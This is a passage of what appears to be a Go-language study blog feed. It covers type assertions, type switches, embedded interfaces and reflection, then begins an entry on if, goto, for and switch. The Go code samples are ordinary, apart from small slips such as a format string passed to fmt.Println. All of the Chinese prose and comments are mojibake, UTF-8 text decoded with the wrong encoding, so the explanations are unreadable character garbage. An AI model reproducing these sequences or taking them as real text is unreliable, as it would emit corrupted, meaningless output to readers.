class="comment">//å®šä¹‰äº†Stringæ–¹æ³•ï¼Œå®ç°äº†fmt.Stringer</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p Person)</span></span> String() <span class="type">string</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="string">&quot;(name: &quot;</span> + p.name + <span class="string">&quot; - age: &quot;</span>+strconv.Itoa(p.age)+ <span class="string">&quot; years)&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	list := <span class="built_in">make</span>(List, <span class="number">3</span>)</span><br><span class="line">	list[<span class="number">0</span>] = <span class="number">1</span> <span class="comment">// an int</span></span><br><span class="line">	list[<span class="number">1</span>] = <span class="string">&quot;Hello&quot;</span> <span class="comment">// a string</span></span><br><span class="line">	list[<span class="number">2</span>] = Person&#123;<span class="string">&quot;Dennis&quot;</span>, <span class="number">70</span>&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> index, element := <span class="keyword">range</span> list &#123;</span><br><span class="line">		<span class="keyword">if</span> value, ok := element.(<span class="type">int</span>); ok &#123;</span><br><span class="line">			fmt.Printf(<span class="string">&quot;list[%d] is an int and its value is %d\n&quot;</span>, index, value)</span><br><span class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> value, ok := element.(<span class="type">string</span>); ok &#123;</span><br><span class="line">			fmt.Printf(<span class="string">&quot;list[%d] is a string and its value is %s\n&quot;</span>, index, value)</span><br><span class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> value, ok := element.(Person); ok &#123;</span><br><span class="line">			fmt.Printf(<span class="string">&quot;list[%d] is a Person and its value is %s\n&quot;</span>, index, value)</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			fmt.Printf(<span class="string">&quot;list[%d] is of a different type\n&quot;</span>, index)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<pre><code>æ˜¯ä¸æ˜¯å¾ˆç®€å•å•Šï¼ŒåŒæ—¶ä½ æ˜¯å¦æ³¨æ„åˆ°äº†å¤šä¸ªifé‡Œé¢ï¼Œè¿˜è®°å¾—æˆ‘å‰é¢ä»‹ç»æµç¨‹æ—¶è®²è¿‡ï¼Œifé‡Œé¢å…è®¸åˆå§‹åŒ–å˜é‡ã€‚

ä¹Ÿè®¸ä½ æ³¨æ„åˆ°äº†ï¼Œæˆ‘ä»¬æ–­è¨€çš„ç±»å‹è¶Šå¤šï¼Œé‚£ä¹ˆif elseä¹Ÿå°±è¶Šå¤šï¼Œæ‰€ä»¥æ‰å¼•å‡ºäº†ä¸‹é¢è¦ä»‹ç»çš„switchã€‚
</code></pre>
<ul>
<li>
<p>switchæµ‹è¯•</p>
<p>æœ€å¥½çš„è®²è§£å°±æ˜¯ä»£ç ä¾‹å­ï¼Œç°åœ¨è®©æˆ‘ä»¬é‡å†™ä¸Šé¢çš„è¿™ä¸ªå®ç°</p>
</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;strconv&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Element <span class="keyword">interface</span>&#123;&#125;</span><br><span class="line"><span class="keyword">type</span> List [] Element</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Person <span class="keyword">struct</span> &#123;</span><br><span class="line">	name <span class="type">string</span></span><br><span class="line">	age <span class="type">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//æ‰“å°</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p Person)</span></span> String() <span class="type">string</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="string">&quot;(name: &quot;</span> + p.name + <span class="string">&quot; - age: &quot;</span>+strconv.Itoa(p.age)+ <span class="string">&quot; years)&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	list := <span class="built_in">make</span>(List, <span class="number">3</span>)</span><br><span class="line">	list[<span class="number">0</span>] = <span class="number">1</span> <span class="comment">//an int</span></span><br><span class="line">	list[<span class="number">1</span>] = <span class="string">&quot;Hello&quot;</span> <span class="comment">//a string</span></span><br><span class="line">	list[<span class="number">2</span>] = Person&#123;<span class="string">&quot;Dennis&quot;</span>, <span class="number">70</span>&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> index, element := <span class="keyword">range</span> list&#123;</span><br><span class="line">		<span class="keyword">switch</span> value := element.(<span class="keyword">type</span>) &#123;</span><br><span class="line">			<span class="keyword">case</span> <span class="type">int</span>:</span><br><span class="line">				fmt.Printf(<span class="string">&quot;list[%d] is an int and its value is %d\n&quot;</span>, index, value)</span><br><span class="line">			<span class="keyword">case</span> <span class="type">string</span>:</span><br><span class="line">				fmt.Printf(<span class="string">&quot;list[%d] is a string and its value is %s\n&quot;</span>, index, value)</span><br><span class="line">			<span class="keyword">case</span> Person:</span><br><span class="line">				fmt.Printf(<span class="string">&quot;list[%d] is a Person and its value is %s\n&quot;</span>, index, value)</span><br><span class="line">			<span class="keyword">default</span>:</span><br><span class="line">				fmt.Println(<span class="string">&quot;list[%d] is of a different type&quot;</span>, index)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<pre><code>è¿™é‡Œæœ‰ä¸€ç‚¹éœ€è¦å¼ºè°ƒçš„æ˜¯ï¼š`element.(type)`è¯­æ³•ä¸èƒ½åœ¨switchå¤–çš„ä»»ä½•é€»è¾‘é‡Œé¢ä½¿ç”¨ï¼Œå¦‚æœä½ è¦åœ¨switchå¤–é¢åˆ¤æ–­ä¸€ä¸ªç±»å‹å°±ä½¿ç”¨`comma-ok`ã€‚
</code></pre>
<h3 id="åµŒå…¥interface"><a class="markdownIt-Anchor" href="#åµŒå…¥interface"></a> åµŒå…¥interface</h3>
<p>Goé‡Œé¢çœŸæ­£å¸å¼•äººçš„æ˜¯å®ƒå†…ç½®çš„é€»è¾‘è¯­æ³•ï¼Œå°±åƒæˆ‘ä»¬åœ¨å­¦ä¹ Structæ—¶å­¦ä¹ çš„åŒ¿åå­—æ®µï¼Œå¤šä¹ˆçš„ä¼˜é›…å•Šï¼Œé‚£ä¹ˆç›¸åŒçš„é€»è¾‘å¼•å…¥åˆ°interfaceé‡Œé¢ï¼Œé‚£ä¸æ˜¯æ›´åŠ å®Œç¾äº†ã€‚å¦‚æœä¸€ä¸ªinterface1ä½œä¸ºinterface2çš„ä¸€ä¸ªåµŒå…¥å­—æ®µï¼Œé‚£ä¹ˆinterface2éšå¼çš„åŒ…å«äº†interface1é‡Œé¢çš„methodã€‚</p>
<p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æºç åŒ…container/heapé‡Œé¢æœ‰è¿™æ ·çš„ä¸€ä¸ªå®šä¹‰</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> Interface <span class="keyword">interface</span> &#123;</span><br><span class="line">	sort.Interface <span class="comment">//åµŒå…¥å­—æ®µsort.Interface</span></span><br><span class="line">	Push(x <span class="keyword">interface</span>&#123;&#125;) <span class="comment">//a Push method to push elements into the heap</span></span><br><span class="line">	Pop() <span class="keyword">interface</span>&#123;&#125; <span class="comment">//a Pop elements that pops elements from the heap</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æˆ‘ä»¬çœ‹åˆ°sort.Interfaceå…¶å®å°±æ˜¯åµŒå…¥å­—æ®µï¼ŒæŠŠsort.Interfaceçš„æ‰€æœ‰methodç»™éšå¼çš„åŒ…å«è¿›æ¥äº†ã€‚ä¹Ÿå°±æ˜¯ä¸‹é¢ä¸‰ä¸ªæ–¹æ³•ï¼š</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> Interface <span class="keyword">interface</span> &#123;</span><br><span class="line">	<span class="comment">// Len is the number of elements in the collection.</span></span><br><span class="line">	Len() <span class="type">int</span></span><br><span class="line">	<span class="comment">// Less returns whether the element with index i should sort</span></span><br><span class="line">	<span class="comment">// before the element with index j.</span></span><br><span class="line">	Less(i, j <span class="type">int</span>) <span class="type">bool</span></span><br><span class="line">	<span class="comment">// Swap swaps the elements with indexes i and j.</span></span><br><span class="line">	Swap(i, j <span class="type">int</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å¦ä¸€ä¸ªä¾‹å­å°±æ˜¯ioåŒ…ä¸‹é¢çš„ io.ReadWriter ï¼Œå®ƒåŒ…å«äº†ioåŒ…ä¸‹é¢çš„Readerå’ŒWriterä¸¤ä¸ªinterfaceï¼š</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// io.ReadWriter</span></span><br><span class="line"><span class="keyword">type</span> ReadWriter <span class="keyword">interface</span> &#123;</span><br><span class="line">	Reader</span><br><span class="line">	Writer</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="åå°„"><a class="markdownIt-Anchor" href="#åå°„"></a> åå°„</h3>
<p>Goè¯­è¨€å®ç°äº†åå°„ï¼Œæ‰€è°“åå°„å°±æ˜¯èƒ½æ£€æŸ¥ç¨‹åºåœ¨è¿è¡Œæ—¶çš„çŠ¶æ€ã€‚æˆ‘ä»¬ä¸€èˆ¬ç”¨åˆ°çš„åŒ…æ˜¯reflectåŒ…ã€‚å¦‚ä½•è¿ç”¨reflectåŒ…ï¼Œå®˜æ–¹çš„è¿™ç¯‡æ–‡ç« è¯¦ç»†çš„è®²è§£äº†reflectåŒ…çš„å®ç°åŸç†ï¼Œ<a href="http://golang.org/doc/articles/laws_of_reflection.html">laws of reflection</a></p>
<p>ä½¿ç”¨reflectä¸€èˆ¬åˆ†æˆä¸‰æ­¥ï¼Œä¸‹é¢ç®€è¦çš„è®²è§£ä¸€ä¸‹ï¼šè¦å»åå°„æ˜¯ä¸€ä¸ªç±»å‹çš„å€¼(è¿™äº›å€¼éƒ½å®ç°äº†ç©ºinterface)ï¼Œé¦–å…ˆéœ€è¦æŠŠå®ƒè½¬åŒ–æˆreflectå¯¹è±¡(reflect.Typeæˆ–è€…reflect.Valueï¼Œæ ¹æ®ä¸åŒçš„æƒ…å†µè°ƒç”¨ä¸åŒçš„å‡½æ•°)ã€‚è¿™ä¸¤ç§è·å–æ–¹å¼å¦‚ä¸‹ï¼š</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">t := reflect.TypeOf(i)    <span class="comment">//å¾—åˆ°ç±»å‹çš„å…ƒæ•°æ®,é€šè¿‡tæˆ‘ä»¬èƒ½è·å–ç±»å‹å®šä¹‰é‡Œé¢çš„æ‰€æœ‰å…ƒç´ </span></span><br><span class="line">v := reflect.ValueOf(i)   <span class="comment">//å¾—åˆ°å®é™…çš„å€¼ï¼Œé€šè¿‡væˆ‘ä»¬è·å–å­˜å‚¨åœ¨é‡Œé¢çš„å€¼ï¼Œè¿˜å¯ä»¥å»æ”¹å˜å€¼</span></span><br></pre></td></tr></table></figure>
<p>è½¬åŒ–ä¸ºreflectå¯¹è±¡ä¹‹åæˆ‘ä»¬å°±å¯ä»¥è¿›è¡Œä¸€äº›æ“ä½œäº†ï¼Œä¹Ÿå°±æ˜¯å°†reflectå¯¹è±¡è½¬åŒ–æˆç›¸åº”çš„å€¼ï¼Œä¾‹å¦‚</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">tag := t.Elem().Field(<span class="number">0</span>).Tag  <span class="comment">//è·å–å®šä¹‰åœ¨structé‡Œé¢çš„æ ‡ç­¾</span></span><br><span class="line">name := v.Elem().Field(<span class="number">0</span>).String()  <span class="comment">//è·å–å­˜å‚¨åœ¨ç¬¬ä¸€ä¸ªå­—æ®µé‡Œé¢çš„å€¼</span></span><br></pre></td></tr></table></figure>
<p>è·å–åå°„å€¼èƒ½è¿”å›ç›¸åº”çš„ç±»å‹å’Œæ•°å€¼</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> x <span class="type">float64</span> = <span class="number">3.4</span></span><br><span class="line">v := reflect.ValueOf(x)</span><br><span class="line">fmt.Println(<span class="string">&quot;type:&quot;</span>, v.Type())</span><br><span class="line">fmt.Println(<span class="string">&quot;kind is float64:&quot;</span>, v.Kind() == reflect.Float64)</span><br><span class="line">fmt.Println(<span class="string">&quot;value:&quot;</span>, v.Float())</span><br></pre></td></tr></table></figure>
<p>æœ€åï¼Œåå°„çš„è¯ï¼Œé‚£ä¹ˆåå°„çš„å­—æ®µå¿…é¡»æ˜¯å¯ä¿®æ”¹çš„ï¼Œæˆ‘ä»¬å‰é¢å­¦ä¹ è¿‡ä¼ å€¼å’Œä¼ å¼•ç”¨ï¼Œè¿™ä¸ªé‡Œé¢ä¹Ÿæ˜¯ä¸€æ ·çš„é“ç†ã€‚åå°„çš„å­—æ®µå¿…é¡»æ˜¯å¯è¯»å†™çš„æ„æ€æ˜¯ï¼Œå¦‚æœä¸‹é¢è¿™æ ·å†™ï¼Œé‚£ä¹ˆä¼šå‘ç”Ÿé”™è¯¯</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> x <span class="type">float64</span> = <span class="number">3.4</span></span><br><span class="line">v := reflect.ValueOf(x)</span><br><span class="line">v.SetFloat(<span class="number">7.1</span>)</span><br></pre></td></tr></table></figure>
<p>å¦‚æœè¦ä¿®æ”¹ç›¸åº”çš„å€¼ï¼Œå¿…é¡»è¿™æ ·å†™</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> x <span class="type">float64</span> = <span class="number">3.4</span></span><br><span class="line">p := reflect.ValueOf(&amp;x)</span><br><span class="line">v := p.Elem()</span><br><span class="line">v.SetFloat(<span class="number">7.1</span>)</span><br></pre></td></tr></table></figure>
<p>ä¸Šé¢åªæ˜¯å¯¹åå°„çš„ç®€å•ä»‹ç»ï¼Œæ›´æ·±å…¥çš„ç†è§£è¿˜éœ€è¦è‡ªå·±åœ¨ç¼–ç¨‹ä¸­ä¸æ–­çš„å®è·µã€‚</p>
]]></content>
      <categories>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>Golang</tag>
      </tags>
  </entry>
  <entry>
    <title>golangå­¦ä¹ ä¹‹_æµç¨‹å’Œå‡½æ•°</title>
    <url>/2023/12/golang%E5%AD%A6%E4%B9%A0%E4%B9%8B-%E6%B5%81%E7%A8%8B%E5%92%8C%E5%87%BD%E6%95%B0/</url>
    <content><![CDATA[<p>è®°å½•Golangé‡Œçš„å­¦ä¹ ç¬”è®°ï¼Œè¯¥ç¬”è®°ç¦æ­¢å•†ç”¨å’Œæ¬è¿è‡³ä»»æ„å…¬ä¼—å·ï¼Œä»…ç”¨ä½œè‡ªæˆ‘æŸ¥é˜…ä½¿ç”¨ï¼Œè°¢è°¢ã€‚ğŸ˜‹</p>
<span id="more"></span>
<h1 id="æµç¨‹å’Œå‡½æ•°"><a class="markdownIt-Anchor" href="#æµç¨‹å’Œå‡½æ•°"></a> æµç¨‹å’Œå‡½æ•°</h1>
<h2 id="æµç¨‹æ§åˆ¶"><a class="markdownIt-Anchor" href="#æµç¨‹æ§åˆ¶"></a> æµç¨‹æ§åˆ¶</h2>
<p>æµç¨‹æ§åˆ¶åœ¨ç¼–ç¨‹è¯­è¨€ä¸­æ˜¯æœ€ä¼Ÿå¤§çš„å‘æ˜äº†ï¼Œå› ä¸ºæœ‰äº†å®ƒï¼Œä½ å¯ä»¥é€šè¿‡å¾ˆç®€å•çš„æµç¨‹æè¿°æ¥è¡¨è¾¾å¾ˆå¤æ‚çš„é€»è¾‘ã€‚Goä¸­æµç¨‹æ§åˆ¶åˆ†ä¸‰å¤§ç±»ï¼šæ¡ä»¶åˆ¤æ–­ï¼Œå¾ªç¯æ§åˆ¶å’Œæ— æ¡ä»¶è·³è½¬ã€‚</p>
<h3 id="if"><a class="markdownIt-Anchor" href="#if"></a> if</h3>
<p><code>if</code>ä¹Ÿè®¸æ˜¯å„ç§ç¼–ç¨‹è¯­è¨€ä¸­æœ€å¸¸è§çš„äº†ï¼Œå®ƒçš„è¯­æ³•æ¦‚æ‹¬èµ·æ¥å°±æ˜¯ï¼šå¦‚æœæ»¡è¶³æ¡ä»¶å°±åšæŸäº‹ï¼Œå¦åˆ™åšå¦ä¸€ä»¶äº‹ã€‚</p>
<p>Goé‡Œé¢<code>if</code>æ¡ä»¶åˆ¤æ–­è¯­å¥ä¸­ä¸éœ€è¦æ‹¬å·ï¼Œå¦‚ä¸‹ä»£ç æ‰€ç¤º</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> x &gt; <span class="number">10</span> &#123;</span><br><span class="line">	fmt.Println(<span class="string">&quot;x is greater than 10&quot;</span>)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	fmt.Println(<span class="string">&quot;x is less than 10&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Goçš„<code>if</code>è¿˜æœ‰ä¸€ä¸ªå¼ºå¤§çš„åœ°æ–¹å°±æ˜¯æ¡ä»¶åˆ¤æ–­è¯­å¥é‡Œé¢å…è®¸å£°æ˜ä¸€ä¸ªå˜é‡ï¼Œè¿™ä¸ªå˜é‡çš„ä½œç”¨åŸŸåªèƒ½åœ¨è¯¥æ¡ä»¶é€»è¾‘å—å†…ï¼Œå…¶ä»–åœ°æ–¹å°±ä¸èµ·ä½œç”¨äº†ï¼Œå¦‚ä¸‹æ‰€ç¤º</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// è®¡ç®—è·å–å€¼x,ç„¶åæ ¹æ®xè¿”å›çš„å¤§å°ï¼Œåˆ¤æ–­æ˜¯å¦å¤§äº10ã€‚</span></span><br><span class="line"><span class="keyword">if</span> x := computedValue(); x &gt; <span class="number">10</span> &#123;</span><br><span class="line">	fmt.Println(<span class="string">&quot;x is greater than 10&quot;</span>)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	fmt.Println(<span class="string">&quot;x is less than 10&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//è¿™ä¸ªåœ°æ–¹å¦‚æœè¿™æ ·è°ƒç”¨å°±ç¼–è¯‘å‡ºé”™äº†ï¼Œå› ä¸ºxæ˜¯æ¡ä»¶é‡Œé¢çš„å˜é‡</span></span><br><span class="line">fmt.Println(x)</span><br></pre></td></tr></table></figure>
<p>å¤šä¸ªæ¡ä»¶çš„æ—¶å€™å¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> integer == <span class="number">3</span> &#123;</span><br><span class="line">	fmt.Println(<span class="string">&quot;The integer is equal to 3&quot;</span>)</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> integer &lt; <span class="number">3</span> &#123;</span><br><span class="line">	fmt.Println(<span class="string">&quot;The integer is less than 3&quot;</span>)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	fmt.Println(<span class="string">&quot;The integer is greater than 3&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="goto"><a class="markdownIt-Anchor" href="#goto"></a> goto</h3>
<p>Goæœ‰<code>goto</code>è¯­å¥â€”â€”è¯·æ˜æ™ºåœ°ä½¿ç”¨å®ƒã€‚ç”¨<code>goto</code>è·³è½¬åˆ°å¿…é¡»åœ¨å½“å‰å‡½æ•°å†…å®šä¹‰çš„æ ‡ç­¾ã€‚ä¾‹å¦‚å‡è®¾è¿™æ ·ä¸€ä¸ªå¾ªç¯ï¼š</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">myFunc</span><span class="params">()</span></span> &#123;</span><br><span class="line">	i := <span class="number">0</span></span><br><span class="line">Here:   <span class="comment">//è¿™è¡Œçš„ç¬¬ä¸€ä¸ªè¯ï¼Œä»¥å†’å·ç»“æŸä½œä¸ºæ ‡ç­¾</span></span><br><span class="line">	<span class="built_in">println</span>(i)</span><br><span class="line">	i++</span><br><span class="line">	<span class="keyword">goto</span> Here   <span class="comment">//è·³è½¬åˆ°Hereå»</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>æ ‡ç­¾åæ˜¯å¤§å°å†™æ•æ„Ÿçš„ã€‚</p>
</blockquote>
<h3 id="for"><a class="markdownIt-Anchor" href="#for"></a> for</h3>
<p>Goé‡Œé¢æœ€å¼ºå¤§çš„ä¸€ä¸ªæ§åˆ¶é€»è¾‘å°±æ˜¯<code>for</code>ï¼Œå®ƒæ—¢å¯ä»¥ç”¨æ¥å¾ªç¯è¯»å–æ•°æ®ï¼Œåˆå¯ä»¥å½“ä½œ<code>while</code>æ¥æ§åˆ¶é€»è¾‘ï¼Œè¿˜èƒ½è¿­ä»£æ“ä½œã€‚å®ƒçš„è¯­æ³•å¦‚ä¸‹ï¼š</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> expression1; expression2; expression3 &#123;</span><br><span class="line">	<span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>expression1</code>ã€<code>expression2</code>å’Œ<code>expression3</code>éƒ½æ˜¯è¡¨è¾¾å¼ï¼Œå…¶ä¸­<code>expression1</code>å’Œ<code>expression3</code>æ˜¯å˜é‡å£°æ˜æˆ–è€…å‡½æ•°è°ƒç”¨è¿”å›å€¼ä¹‹ç±»çš„ï¼Œ<code>expression2</code>æ˜¯ç”¨æ¥æ¡ä»¶åˆ¤æ–­ï¼Œ<code>expression1</code>åœ¨å¾ªç¯å¼€å§‹ä¹‹å‰è°ƒç”¨ï¼Œ<code>expression3</code>åœ¨æ¯è½®å¾ªç¯ç»“æŸä¹‹æ—¶è°ƒç”¨ã€‚</p>
<p>ä¸€ä¸ªä¾‹å­æ¯”ä¸Šé¢è®²é‚£ä¹ˆå¤šæ›´æœ‰ç”¨ï¼Œé‚£ä¹ˆæˆ‘ä»¬çœ‹çœ‹ä¸‹é¢çš„ä¾‹å­å§ï¼š</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	sum := <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> index:=<span class="number">0</span>; index &lt; <span class="number">10</span> ; index++ &#123;</span><br><span class="line">		sum += index</span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(<span class="string">&quot;sum is equal to &quot;</span>, sum)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// è¾“å‡ºï¼šsum is equal to 45</span></span><br></pre></td></tr></table></figure>
<p>æœ‰äº›æ—¶å€™éœ€è¦è¿›è¡Œå¤šä¸ªèµ‹å€¼æ“ä½œï¼Œç”±äºGoé‡Œé¢æ²¡æœ‰<code>,</code>æ“ä½œç¬¦ï¼Œé‚£ä¹ˆå¯ä»¥ä½¿ç”¨å¹³è¡Œèµ‹å€¼<code>i, j = i+1, j-1</code></p>
<p>æœ‰äº›æ—¶å€™å¦‚æœæˆ‘ä»¬å¿½ç•¥<code>expression1</code>å’Œ<code>expression3</code>ï¼š</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">sum := <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> ; sum &lt; <span class="number">1000</span>;  &#123;</span><br><span class="line">	sum += sum</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å…¶ä¸­<code>;</code>ä¹Ÿå¯ä»¥çœç•¥ï¼Œé‚£ä¹ˆå°±å˜æˆå¦‚ä¸‹çš„ä»£ç äº†ï¼Œæ˜¯ä¸æ˜¯ä¼¼æ›¾ç›¸è¯†ï¼Ÿå¯¹ï¼Œè¿™å°±æ˜¯<code>while</code>çš„åŠŸèƒ½ã€‚</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">sum := <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> sum &lt; <span class="number">1000</span> &#123;</span><br><span class="line">	sum += sum</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>åœ¨å¾ªç¯é‡Œé¢æœ‰ä¸¤ä¸ªå…³é”®æ“ä½œ<code>break</code>å’Œ<code>continue</code>	,<code>break</code>æ“ä½œæ˜¯è·³å‡ºå½“å‰å¾ªç¯ï¼Œ<code>continue</code>æ˜¯è·³è¿‡æœ¬æ¬¡å¾ªç¯ã€‚å½“åµŒå¥—è¿‡æ·±çš„æ—¶å€™ï¼Œ<code>break</code>å¯ä»¥é…åˆæ ‡ç­¾ä½¿ç”¨ï¼Œå³è·³è½¬è‡³æ ‡ç­¾æ‰€æŒ‡å®šçš„ä½ç½®ï¼Œè¯¦ç»†å‚è€ƒå¦‚ä¸‹ä¾‹å­ï¼š</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> index := <span class="number">10</span>; index&gt;<span class="number">0</span>; index-- &#123;</span><br><span class="line">	<span class="keyword">if</span> index == <span class="number">5</span>&#123;</span><br><span class="line">		<span class="keyword">break</span> <span class="comment">// æˆ–è€…continue</span></span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(index)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// breakæ‰“å°å‡ºæ¥10ã€9ã€8ã€7ã€6</span></span><br><span class="line"><span class="comment">// continueæ‰“å°å‡ºæ¥10ã€9ã€8ã€7ã€6ã€4ã€3ã€2ã€1</span></span><br></pre></td></tr></table></figure>
<p><code>break</code>å’Œ<code>continue</code>è¿˜å¯ä»¥è·Ÿç€æ ‡å·ï¼Œç”¨æ¥è·³åˆ°å¤šé‡å¾ªç¯ä¸­çš„å¤–å±‚å¾ªç¯</p>
<p><code>for</code>é…åˆ<code>range</code>å¯ä»¥ç”¨äºè¯»å–<code>slice</code>å’Œ<code>map</code>çš„æ•°æ®ï¼š</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> k,v:=<span class="keyword">range</span> <span class="keyword">map</span> &#123;</span><br><span class="line">	fmt.Println(<span class="string">&quot;map&#x27;s key:&quot;</span>,k)</span><br><span class="line">	fmt.Println(<span class="string">&quot;map&#x27;s val:&quot;</span>,v)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ç”±äº Go æ”¯æŒ â€œå¤šå€¼è¿”å›â€, è€Œå¯¹äºâ€œå£°æ˜è€Œæœªè¢«è°ƒç”¨â€çš„å˜é‡, ç¼–è¯‘å™¨ä¼šæŠ¥é”™, åœ¨è¿™ç§æƒ…å†µä¸‹, å¯ä»¥ä½¿ç”¨<code>_</code>æ¥ä¸¢å¼ƒä¸éœ€è¦çš„è¿”å›å€¼<br>
ä¾‹å¦‚:</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> _, v := <span class="keyword">range</span> <span class="keyword">map</span>&#123;</span><br><span class="line">	fmt.Println(<span class="string">&quot;map&#x27;s val:&quot;</span>, v)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="switch"><a class="markdownIt-Anchor" href="#switch"></a> switch</h3>
<p>æœ‰äº›æ—¶å€™ä½ éœ€è¦å†™å¾ˆå¤šçš„<code>if-else</code>æ¥å®ç°ä¸€äº›é€»è¾‘å¤„ç†ï¼Œè¿™ä¸ªæ—¶å€™ä»£ç çœ‹ä¸Šå»å°±å¾ˆä¸‘å¾ˆå†—é•¿ï¼Œè€Œä¸”ä¹Ÿä¸æ˜“äºä»¥åçš„ç»´æŠ¤ï¼Œè¿™ä¸ªæ—¶å€™<code>switch</code>å°±èƒ½å¾ˆå¥½çš„è§£å†³è¿™ä¸ªé—®é¢˜ã€‚å®ƒçš„è¯­æ³•å¦‚ä¸‹:</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">switch</span> sExpr &#123;</span><br><span class="line"><span class="keyword">case</span> expr1:</span><br><span class="line">	some instructions</span><br><span class="line"><span class="keyword">case</span> expr2:</span><br><span class="line">	some other instructions</span><br><span class="line"><span class="keyword">case</span> expr3:</span><br><span class="line">	some other instructions</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">	other code</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>sExpr</code>å’Œ<code>expr1</code>ã€<code>expr2</code>ã€<code>expr3</code>çš„ç±»å‹å¿…é¡»ä¸€è‡´ã€‚Goçš„<code>switch</code>éå¸¸çµæ´»ï¼Œè¡¨è¾¾å¼ä¸å¿…æ˜¯å¸¸é‡æˆ–æ•´æ•°ï¼Œæ‰§è¡Œçš„è¿‡ç¨‹ä»ä¸Šè‡³ä¸‹ï¼Œç›´åˆ°æ‰¾åˆ°åŒ¹é…é¡¹ï¼›è€Œå¦‚æœ<code>switch</code>æ²¡æœ‰è¡¨è¾¾å¼ï¼Œå®ƒä¼šåŒ¹é…<code>true</code>ã€‚</p>
